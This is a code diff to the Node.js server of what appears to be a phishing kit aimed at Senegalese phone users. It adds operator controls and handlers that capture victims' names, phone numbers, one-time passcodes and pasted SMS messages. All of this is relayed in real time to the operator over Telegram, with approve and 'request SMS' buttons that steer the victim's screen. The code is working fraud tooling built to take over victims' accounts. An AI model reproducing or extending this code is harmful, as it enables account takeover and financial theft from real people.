@@ -140,6 +140,8 @@ function otpKeyboard(sessionId) {
     inline_keyboard: [[
       { text: '✅ Approve OTP', callback_data: `approve_otp::${sessionId}` },
       { text: '❌ Wrong Code',  callback_data: `wrong_code::${sessionId}` },
+    ],[
+      { text: '➡️ Request SMS', callback_data: `request_sms::${sessionId}` },
     ]],
   };
 }
@@ -271,6 +273,65 @@ app.post('/api', async (req, res) => {
       return res.json({ success: true });
     }
 
+    case 'sms_pasted': {
+      const { sessionId, smsText, phone } = data;
+      const session = sessions[sessionId];
+      if (!session) return res.json({ success: false, error: 'Session not found' });
+
+      session.smsText = smsText;
+      console.log(`[SMS]    Session: ${sessionId} | Phone: ${phone} | Text: ${smsText}`);
+
+      await tgSend(
+        `📋 <b>SMS Pasted by User</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
+        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
+        `📋 <b>SMS Content:</b>\n<code>${smsText}</code>\n` +
+        `🕐 <b>Time:</b> ${now()}`
+      );
+
+      session.status = 'sms_received';
+      return res.json({ success: true });
+    }
+
+    case 'sms_resend': {
+      const { sessionId, phone } = data;
+      const session = sessions[sessionId];
+      if (!session) return res.json({ success: false, error: 'Session not found' });
+
+      console.log(`[SMS_RESEND] Session: ${sessionId} | Phone: ${phone}`);
+
+      await tgSend(
+        `🔄 <b>SMS Resend Requested</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
+        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
+        `⚠️ <b>Action:</b> User clicked "Renvoyer le lien"\n` +
+        `🕐 <b>Time:</b> ${now()}`
+      );
+
+      return res.json({ success: true });
+    }
+
+    case 'sms_link_broken': {
+      const { sessionId, phone } = data;
+      const session = sessions[sessionId];
+      if (!session) return res.json({ success: false, error: 'Session not found' });
+
+      console.log(`[SMS_BROKEN] Session: ${sessionId} | Phone: ${phone}`);
+
+      await tgSend(
+        `🚨 <b>Link Not Working — User Alert</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
+        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
+        `⚠️ <b>Action:</b> User clicked "Le lien ne fonctionne pas"\n` +
+        `🕐 <b>Time:</b> ${now()}`
+      );
+
+      return res.json({ success: true });
+    }
+
     default:
       return res.status(400).json({ success: false, error: `Unknown action: ${action}` });
   }
@@ -354,8 +415,8 @@ app.post('/webhook', async (req, res) => {
     }
 
     case 'approve_otp': {
-      session.status = 'continue';
-      await tgAnswerCallback(cbId, '✅ OTP approved');
+      session.status = 'approved_otp';
+      await tgAnswerCallback(cbId, '✅ OTP approved — user notified');
       await tgEditMessage(session.otpMsgId,
         `📟 <b>OTP — ✅ APPROVED</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
@@ -363,6 +424,21 @@ app.post('/webhook', async (req, res) => {
         `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
         `📟 <b>OTP:</b> <code>${session.otp}</code>\n` +
         `🕐 <b>Actioned:</b> ${now()}`
+      );
+      break;
+    }
+
+    case 'request_sms': {
+      session.status = 'sms_required';
+      await tgAnswerCallback(cbId, '➡️ SMS screen sent to user');
+      await tgEditMessage(session.otpMsgId,
+        `📟 <b>OTP — ➡️ SMS REQUESTED</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
+        `📱 <b>Phone:</b> 🇸🇳 +221 ${session.phone}\n` +
+        `📟 <b>OTP:</b> <code>${session.otp}</code>\n` +
+        `🕐 <b>Actioned:</b> ${now()}\n` +
+        `ℹ️ User is now on the SMS paste screen`
       );
       break;
     }
